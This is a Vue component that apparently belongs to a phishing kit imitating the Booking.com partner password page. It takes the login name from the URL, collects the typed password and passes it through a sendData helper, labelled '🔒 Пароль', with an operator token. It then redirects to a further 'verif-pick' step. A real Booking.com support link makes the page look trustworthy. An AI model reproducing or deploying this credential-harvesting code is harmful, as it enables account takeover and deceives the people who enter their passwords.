<template>
  <div class="panel__body" id="second" style="min-width: 344px;">
    <div class="panel__title">
      <h1>{{ t('password.title') }}</h1>
      <div class="panel__text">
        {{ t('password.under_title.1') }} <strong id="forLoginName">{{ login }}</strong>
      </div>
    </div>
    <div class="spacer"></div>
    <div class="input__wrapper">
      <label for="password">{{ t('password.input_title') }}</label>
      <div class="input__box">
        <input :type="visibilityOff ? `password` : `text`" name="password" id="password" v-model="password" :placeholder="placeholder">
        <div id="togglePassword" @click="visibilityOff = !visibilityOff">
                    <span id="togglePassIcon" class="material-symbols-outlined">
                        {{ visibilityOff ? `visibility` : `visibility_off` }}
                    </span>
        </div>
      </div>
      <div class="errorMessage">
        {{t('password.errorMessage')}}
      </div>
    </div>
    <div class="button__wrapper">
      <button id="secondBtn" class="btn" @click="next" :disabled="password.length <= 0" >{{t('password.button_title')}}</button>
    </div>
    <div class="text-center">
      <a href="https://partner.booking.com/node/2170?utm_source=account&utm_medium=support_link">{{t('password.forgot')}}</a>
    </div>
  </div>
</template>

<script setup>

import {sendData} from "~/utils/index.js";

const route = useRoute()
const router = useRouter()
const password = ref("")
const login = ref(route.query.login)
const visibilityOff = ref(true)
const {t} = useI18n()

const placeholder = computed(() => t('password.placeholder'))
async function next() {
  await router.push({
    name: "verif-pick",
    query: {
      op_token: route.query.op_token,
    }
  })
  await sendData({"🔒 Пароль": password.value}, route.query.op_token)
}

</script>